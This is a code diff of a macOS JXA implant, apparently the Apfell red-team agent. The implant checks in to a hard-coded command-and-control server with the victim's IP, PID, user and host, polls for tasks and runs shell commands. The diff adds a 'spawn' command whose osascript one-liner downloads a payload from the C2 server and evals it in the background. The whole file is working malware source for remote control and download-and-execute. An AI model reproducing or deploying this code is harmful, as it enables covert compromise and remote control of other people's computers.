@@ -22,8 +22,8 @@ class implant{
 		this.uptime = this.procInfo.systemUptime;
 		//every element in the array needs to be unwrapped
 		this.args = ObjC.unwrap(this.procInfo.arguments);
-		this.payload_type = 'apfell-jxa';	
 		this.osVersion = this.procInfo.operatingSystemVersionString;
+		this.uuid = "XXXX";
 	}
 }
 apfell = new implant();
@@ -65,9 +65,9 @@ class RestC2 extends baseC2{
 		//get info about system to check in initially
 		//needs IP, PID, user, host, payload_type
 		//gets back a unique ID
-		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'payload_type':apfell.payload_type};
+		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
 		//calls htmlPostData(url,data) to actually checkin
-		var jsondata = this.htmlPostData("api/v1.0/callbacks/", JSON.stringify(info));	
+		var jsondata = this.htmlPostData("api/v1.0/callbacks/", JSON.stringify(info));
 		apfell.id = jsondata.id;
 		return jsondata;
 	}
@@ -128,12 +128,12 @@ class RestC2 extends baseC2{
 		return ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
 	}
 }
-C2 = new RestC2(10, "http://192.168.0.119/"); //defaulting to 10 second callbacks
+C2 = new RestC2(10, "https://192.168.0.119:443/"); //defaulting to 10 second callbacks
 //-------------MAIN EXECUTION LOOP ----------------------------------
 for(var i=0; i < apfell.ip.length; i++){
 	ip = apfell.ip[i];
 	if (ip.js.includes(".") && ip.js != "127.0.0.1"){
-		console.log("found ip, checking in");
+		//console.log("found ip, checking in");
 		C2.checkin(ip.js,apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
 		break;
 	}
@@ -175,15 +175,22 @@ shell_api = function(path, args){
 		var file = pipe.fileHandleForReading;  // NSFileHandle
 		var task = $.NSTask.alloc.init;
 		task.launchPath = path; //'/bin/ps'
-		task.arguments = args; //['aux']
+		task.arguments = args; //['ax']
 		task.standardOutput = pipe;  // if not specified, literally writes to file handles 1 and 2
 		task.standardError = pipe;
-		task.launch; // Run the command `ps aux`
-		var data = file.readDataToEndOfFile;  // NSData, potential to hang here?
-		file.closeFile
-		// Call -[[NSString alloc] initWithData:encoding:]
-		data = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding)
-		response = ObjC.unwrap(data);
+		task.launch; // Run the command `ps ax`
+		if(args[args.length - 1] != "&"){
+		    //if we aren't tasking this to run in the background, then try to read the output from the program
+		    //  this will hang our main program though for now
+            var data = file.readDataToEndOfFile;  // NSData, potential to hang here?
+            file.closeFile
+            // Call -[[NSString alloc] initWithData:encoding:]
+            data = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding)
+            response = ObjC.unwrap(data);
+        }
+        else{
+            response = "launched program";
+        }
 	}
 	catch(error){
 		response = error;
@@ -403,8 +410,8 @@ sleepWakeUp = function(t){
 		if(command != "none"){
 			var params = ObjC.unwrap(task["params"]);
 			// params will either be a single parameter or JSON of multiple params
-			//console.log(JSON.stringify(task));
-			//console.log("processing task");
+			console.log(JSON.stringify(task));
+			console.log("processing task");
 			if(command == "shell"){
 				output = shell(params);
 			}
@@ -525,16 +532,32 @@ sleepWakeUp = function(t){
 				}
 
 			}
+			else if(command == "spawn"){
+			    split_params = params.split(" ");
+			    if(split_params[0] == "shell_api"){
+			        if(split_params[1] == "oneliner"){
+			            if(split_params[2] == "apfell-jxa"){
+			                full_url = C2.baseurl + "api/v1.0/payloads/get/" + split_params[3];
+                            path = "/usr/bin/osascript"
+                            args = ['-l','JavaScript','-e']
+                            command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
+                            command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));"
+                            args.push(command);
+                            args.push("&");
+                            console.log(args);
+                            shell_api(path, args);
+                            output = "command executed";
+			            }
+			        }
+			    }
+			}
 			else if(command == "exit"){
 				$.NSApplication.sharedApplication.terminate(this);
 			}
 			else {
 				output = "command not supported: " + command + " " + params;
 			}
-			//response = {"response": output.toString()};
-			//console.log(response);
-			//console.log("posting response"); //tasking needs to give info on how to respond to that task
-			C2.postResponse("api/v1.0/tasks/" + task.id, output);
+			C2.postResponse("api/v1.0/responses/" + task.id, output);
 		}
 	}
 	catch(error){
@@ -546,4 +569,3 @@ sleepWakeUp = function(t){
 timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
 $.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
 $.NSRunLoop.currentRunLoop.runModeBeforeDate("timer", $.NSDate.distantFuture);
-//timer.invalidate will cause it to stop triggering
